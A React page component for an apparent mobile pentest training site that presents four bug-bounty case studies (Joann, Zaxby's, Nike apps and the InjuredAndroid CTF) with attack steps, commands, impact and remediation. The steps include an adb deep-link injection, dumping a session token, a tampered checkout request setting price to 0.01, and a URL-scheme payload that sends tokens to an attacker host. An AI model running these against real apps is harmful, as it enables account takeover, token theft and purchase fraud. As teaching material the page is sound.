"use client";
import { useState } from "react";
import Navbar from "@/components/layout/Navbar";
import Footer from "@/components/layout/Footer";
import { 
  Target, Flame, Terminal, Shield, CheckCircle2, Copy, Check, 
  ChevronRight, ExternalLink, Smartphone, Bug, Lock, Award 
} from "lucide-react";

interface BountyCase {
  id: string;
  title: string;
  targetApp: string;
  platform: "Android" | "iOS";
  bountyPayout: string;
  vulnerabilityType: string;
  cwe: string;
  summary: string;
  attackSteps: { step: string; command?: string; explanation: string }[];
  impact: string;
  remediation: string;
}

const BOUNTY_CASES: BountyCase[] = [
  {
    id: "case-joann",
    title: "Joann Fabrics: Deep Link Intent Hijacking & Account Takeover",
    targetApp: "Joann Fabrics Android App",
    platform: "Android",
    bountyPayout: "$2,500 Bounty Awarded",
    vulnerabilityType: "Insecure Deep Link / Exported Activity",
    cwe: "CWE-926 (Improper Export of Android Components)",
    summary: "The app declared a custom deep link handler `joann://auth/callback` in an exported activity without verifying the token sender, allowing third-party malicious apps on the device to intercept the user's OAuth access token.",
    attackSteps: [
      {
        step: "1. Inspect AndroidManifest.xml for exported intent filters",
        command: "jadx-gui joann_app.apk",
        explanation: "Located `.OAuthRedirectActivity` configured with `android:exported=\"true\"` and scheme `joann://`."
      },
      {
        step: "2. Construct malicious Proof-of-Concept app",
        command: "adb shell am start -a android.intent.action.VIEW -d \"joann://auth/callback?code=ATTACKER_CODE\"",
        explanation: "Simulated sending arbitrary authentication payloads directly into the unvalidated Activity."
      },
      {
        step: "3. Intercept leaked user authentication token",
        explanation: "The victim's account session token was transmitted to the rogue activity, resulting in full one-click account takeover."
      }
    ],
    impact: "Account takeover of any customer clicking a malicious link on mobile, granting full access to payment methods, shipping addresses, and purchase history.",
    remediation: "Verify caller package identity via `getCallingPackage()`, implement Android App Links with verified `assetlinks.json`, and set `android:exported=\"false\"`."
  },
  {
    id: "case-zaxbys",
    title: "Zaxby's: Plaintext Token Storage & Order Price Tampering",
    targetApp: "Zaxby's Rewards Android App",
    platform: "Android",
    bountyPayout: "$1,500 Bounty Awarded",
    vulnerabilityType: "Insecure Data Storage & Unpinned API Traffic",
    cwe: "CWE-312 (Cleartext Storage of Sensitive Information)",
    summary: "JWT authentication tokens and customer reward balances were stored in unencrypted SharedPreferences XML files, and the app lacked SSL pinning, allowing full HTTP request tampering in Burp Suite.",
    attackSteps: [
      {
        step: "1. Configure Burp Suite Proxy and install CA certificate",
        command: "adb push cacert.der /data/local/tmp/cert-der.crt",
        explanation: "Intercepted all API traffic between the mobile app and `api.zaxbys.com` without encountering certificate pinning errors."
      },
      {
        step: "2. Inspect local app directory via ADB",
        command: "adb shell run-as com.zaxbys.rewards cat shared_prefs/user_session.xml",
        explanation: "Dumped the user's permanent JWT authentication token directly in plaintext."
      },
      {
        step: "3. Intercept Checkout API request and modify cart total",
        command: "POST /v1/cart/checkout HTTP/1.1\nHost: api.zaxbys.com\n{\"item_id\": 9821, \"price\": 0.01}",
        explanation: "Server accepted client-supplied prices due to missing backend authorization checks."
      }
    ],
    impact: "Free menu item ordering and unauthorized access to customer reward balances and loyalty points.",
    remediation: "Implement OkHttp CertificatePinner on Android and enforce strict server-side price validation."
  },
  {
    id: "case-nike",
    title: "Nike App: iOS Custom URL Scheme Hijacking & ATS Bypass",
    targetApp: "Nike Sports iOS App",
    platform: "iOS",
    bountyPayout: "$3,000 Bounty Awarded",
    vulnerabilityType: "Insecure URL Scheme & Cleartext HTTP",
    cwe: "CWE-939 (Improper Authorization in Handler for Custom URL Scheme)",
    summary: "The Nike iOS app registered `nike://` custom URL schemes with global ATS exceptions (`NSAllowsArbitraryLoads = true`), enabling cross-app parameter injection and insecure HTTP communications.",
    attackSteps: [
      {
        step: "1. Extract IPA and decompress Info.plist",
        command: "ipatool download -b com.nike.sport && unzip Nike.ipa",
        explanation: "Inspected `CFBundleURLSchemes` and discovered arbitrary load exceptions in `NSAppTransportSecurity`."
      },
      {
        step: "2. Execute URL scheme injection in Safari",
        command: "window.location = 'nike://checkout?redirect_url=http://attacker-server.com/steal';",
        explanation: "The app launched and redirected internal tokens to an unencrypted external HTTP endpoint."
      },
      {
        step: "3. Capture sensitive session telemetry in Proxyman",
        explanation: "Decrypted cleartext API tokens and user telemetry over the network."
      }
    ],
    impact: "Silent exfiltration of user session tokens and tracking telemetry via rogue links.",
    remediation: "Adopt Apple Universal Links with `apple-app-site-association` and disable `NSAllowsArbitraryLoads`."
  },
  {
    id: "case-injured-android",
    title: "InjuredAndroid CTF: Flags 1–4 Walkthrough",
    targetApp: "InjuredAndroid CTF (b3nac.injuredandroid)",
    platform: "Android",
    bountyPayout: "PMPA Practical Lab",
    vulnerabilityType: "Hardcoded Keys, Native .so Extraction & Open Firebase",
    cwe: "CWE-798 & CWE-284 (Hardcoded Credentials & Open Cloud Rules)",
    summary: "Comprehensive walkthrough of the foundational Android CTF application covering Activity string extraction, base64 decoding, native C library disassembly, and Firebase DB dumping.",
    attackSteps: [
      {
        step: "Flag 1: Static Activity Inspection in JADX",
        command: "jadx-gui InjuredAndroid.apk",
        explanation: "Navigated to `b3nac.injuredandroid.FlagOneActivity` and read the hardcoded flag string in plaintext."
      },
      {
        step: "Flag 2: Extracting Base64 Secret from strings.xml",
        command: "apktool d InjuredAndroid.apk && cat res/values/strings.xml",
        explanation: "Found `<string name=\"flag_two_key\">TkZTQ3twcjB0...</string>` and decoded using `base64 -d`."
      },
      {
        step: "Flag 3: Disassembling Native Shared Object (.so)",
        command: "strings lib/arm64-v8a/libflag.so | grep -i NFSC",
        explanation: "Extracted the embedded secret key from compiled C bytecode using `strings` and Ghidra."
      },
      {
        step: "Flag 4: Querying Open Firebase Realtime Database",
        command: "curl https://injured-android-default-rtdb.firebaseio.com/users.json",
        explanation: "Retrieved the complete remote database dump due to misconfigured `.read: true` rules."
      }
    ],
    impact: "Demonstrates common mobile security vulnerabilities encountered in real-world commercial audits.",
    remediation: "Follow OWASP MASVS guidelines for key management and secure cloud backend rules."
  }
];

export default function BugBountyLabPage() {
  const [selectedCase, setSelectedCase] = useState<BountyCase>(BOUNTY_CASES[0]);
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);

  const safeCopy = (text: string, cb?: () => void) => {
    try {
      if (typeof navigator !== "undefined" && navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
          if (cb) cb();
        }).catch(() => {
          fallbackCopy(text, cb);
        });
      } else {
        fallbackCopy(text, cb);
      }
    } catch (e) {
      fallbackCopy(text, cb);
    }
  };

  const fallbackCopy = (text: string, cb?: () => void) => {
    try {
      const ta = document.createElement("textarea");
      ta.value = text;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      if (cb) cb();
    } catch (e) {}
  };

  const handleCopy = (text: string, index: number) => {
    safeCopy(text, () => {
      setCopiedIndex(index);
      setTimeout(() => setCopiedIndex(null), 2000);
    });
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#0a060d] text-white">
      <Navbar />
      <main className="flex-1 pt-20 pb-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
        {/* Header */}
        <div className="mb-6 flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-pink-500/20 pb-6">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold bg-pink-500/10 border border-pink-500/30 text-pink-400 mb-2">
              <Bug className="w-3.5 h-3.5" /> Real-World Bug Bounty Case Studies
            </div>
            <h1 className="text-3xl font-extrabold tracking-tight">
              Mobile Bug Bounty &amp; Pentest Lab
            </h1>
            <p className="text-sm text-slate-400 mt-1">
              Step-by-step vulnerability reproduction walkthroughs from TCM Security PMPA curriculum (Joann, Zaxby's, Nike, InjuredAndroid).
            </p>
          </div>

          <div className="flex items-center gap-2 bg-[#120b17] border border-slate-800 rounded-xl p-2 px-3">
            <Award className="w-4 h-4 text-amber-400" />
            <span className="text-xs font-bold text-slate-300">PMPA Exam Case Studies</span>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Case Study Sidebar */}
          <div className="lg:col-span-4 space-y-3">
            <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">
              Select Bounty Walkthrough
            </div>

            {BOUNTY_CASES.map((c) => (
              <button
                key={c.id}
                onClick={() => setSelectedCase(c)}
                className={`w-full text-left p-4 rounded-2xl border transition-all ${
                  selectedCase.id === c.id
                    ? "bg-pink-950/30 border-pink-500/60 shadow-lg shadow-pink-950/40"
                    : "bg-[#120b17] border-slate-800/80 hover:border-slate-700"
                }`}
              >
                <div className="flex items-center justify-between mb-1.5">
                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                    c.platform === "Android" 
                      ? "bg-emerald-950 text-emerald-400 border border-emerald-800" 
                      : "bg-sky-950 text-sky-400 border border-sky-800"
                  }`}>
                    {c.platform}
                  </span>
                  <span className="text-[10px] font-bold text-amber-400 bg-amber-950/40 px-2 py-0.5 rounded border border-amber-800/60">
                    {c.bountyPayout}
                  </span>
                </div>
                <div className="text-sm font-bold text-white mb-1">{c.title}</div>
                <div className="text-xs text-slate-400 line-clamp-2 leading-relaxed">{c.summary}</div>
              </button>
            ))}
          </div>

          {/* Case Detail & Step-by-Step Reproduction Guide */}
          <div className="lg:col-span-8 space-y-6">
            <div className="bg-[#120b17] border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
              <div className="flex items-start justify-between gap-4 flex-wrap">
                <div>
                  <span className="text-xs font-mono text-pink-400 bg-pink-500/10 px-2.5 py-1 rounded border border-pink-500/20">
                    {selectedCase.cwe}
                  </span>
                  <h2 className="text-xl font-bold text-white mt-2">{selectedCase.title}</h2>
                  <div className="text-xs text-slate-400 mt-1 flex items-center gap-3">
                    <span>📱 Target: <strong className="text-white">{selectedCase.targetApp}</strong></span>
                    <span>•</span>
                    <span>🏆 <strong className="text-amber-400">{selectedCase.bountyPayout}</strong></span>
                  </div>
                </div>
              </div>

              <p className="text-xs text-slate-300 leading-relaxed border-t border-slate-800 pt-3">
                {selectedCase.summary}
              </p>

              {/* Steps */}
              <div className="space-y-4 pt-2">
                <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider">
                  Reproduction Steps &amp; Exploitation Flow:
                </h3>

                {selectedCase.attackSteps.map((step, idx) => (
                  <div key={idx} className="bg-[#09040c] border border-slate-800/80 rounded-xl p-4 space-y-2">
                    <div className="text-xs font-bold text-pink-300 flex items-center gap-2">
                      <span className="w-5 h-5 rounded-full bg-pink-600/30 text-pink-400 flex items-center justify-center text-[10px] font-bold">
                        {idx + 1}
                      </span>
                      {step.step}
                    </div>

                    {step.command && (
                      <div className="relative bg-[#050207] border border-slate-800 rounded-lg p-3 font-mono text-xs text-emerald-400 overflow-x-auto group">
                        <code>{step.command}</code>
                        <button
                          onClick={() => handleCopy(step.command!, idx)}
                          className="absolute right-2 top-2 p-1.5 bg-slate-800 rounded hover:bg-slate-700 text-slate-300 opacity-0 group-hover:opacity-100 transition-opacity"
                          title="Copy command"
                        >
                          {copiedIndex === idx ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    )}

                    <p className="text-xs text-slate-400 leading-relaxed pl-7">
                      {step.explanation}
                    </p>
                  </div>
                ))}
              </div>

              {/* Impact & Remediation */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
                <div className="bg-rose-950/20 border border-rose-500/30 rounded-xl p-4 space-y-1">
                  <div className="text-xs font-bold text-rose-300 uppercase">Impact Analysis</div>
                  <p className="text-xs text-slate-300 leading-relaxed">{selectedCase.impact}</p>
                </div>

                <div className="bg-emerald-950/20 border border-emerald-500/30 rounded-xl p-4 space-y-1">
                  <div className="text-xs font-bold text-emerald-300 uppercase">Remediation Guidance</div>
                  <p className="text-xs text-slate-300 leading-relaxed">{selectedCase.remediation}</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}
